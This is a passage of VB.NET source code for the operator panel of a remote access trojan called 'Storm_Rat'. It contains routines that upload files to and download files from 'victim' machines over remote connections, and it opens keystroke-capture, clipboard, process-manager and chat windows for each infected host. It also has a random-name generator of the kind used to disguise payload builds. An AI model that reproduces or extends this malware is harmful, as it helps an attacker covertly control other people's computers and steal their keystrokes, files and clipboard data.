                                Dim bytesRead As Integer = fs.Read(packet, 0, sizeOfParts)
                                If bytesRead = 0 Then
                                    fileInProgress.SubItems(5).Text = "100%" : DirectCast(fileInProgress.Tag, FileUpload).id = 0
                                    fileInProgress.SubItems(4).Text = TimeOfDay : fs.Close() : Exit Sub
                                End If
                                u.nextPart = False
                                DirectCast(itm.Tag, Connection).Send("UploadContinue|" & u.victimLocation & IO.Path.GetFileName(u.filepath) & "|" & u.id, packet)
                                currentAmount += bytesRead : percentage = Math.Round(currentAmount / f.Length * 100)
                            Loop
                            Exit For
                        End If
                    End If
                Next
            End If
            Exit For
        Next
    End Sub

    Sub StartDownloading(ByVal d As FileDownload)
        For Each itm As ListViewItem In ConnectionList.Items
            If DirectCast(itm.Tag, Connection).IPAddress = d.ip Then
                Dim item As New ListViewItem({Path.GetFileName(d.filepath), d.filesize & " byte(s)", "From Server", TimeOfDay, "N/A", "0%"}) With {.Tag = d}
                TransfersListView.Items.Add(item)
                DirectCast(itm.Tag, Connection).Send("Download|" & d.victimLocation & "|" & d.id & "|" & d.filepath)
            End If
            Exit For
        Next
    End Sub

    Sub ShowProcessManager(ByVal c As Connection)
        c.processManagerForm.ShowDialog()
    End Sub

    Sub ShowKeystrokeCapture(ByVal c As Connection)
        c.keystrokeCaptureForm.ShowDialog()
    End Sub

    Sub ShowChatSystem(ByVal c As Connection)
        c.chatSystemForm.ShowDialog()
    End Sub

    Sub ShowClipboard(ByVal c As Connection)
        c.clipboardForm.ShowDialog()
    End Sub

    Private Sub Storm_Rat_Resize(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Resize
        If Me.WindowState = FormWindowState.Minimized Then Me.Hide()
    End Sub

    Private Sub NotifyIcon_MouseDoubleClick(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles NotifyIcon.MouseDoubleClick
        Me.Show() : Me.WindowState = FormWindowState.Normal
    End Sub

    Public Function RandomVariable(ByVal minamount As Integer, ByVal maxamount As Integer) As String
        Dim Rand As New Random
        Dim TheVariable As String = Nothing
        Dim CharactersToUse As String = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKHJJGFDSAZXCVBNM"
        For x As Integer = 1 To Rand.Next(minamount + 1, maxamount)
            Dim PickAChar As Integer = Int((CharactersToUse.Length - 2) * Rnd()) + 1
            TheVariable += (CharactersToUse(PickAChar))
        Next
        Return TheVariable
    End Function
End Class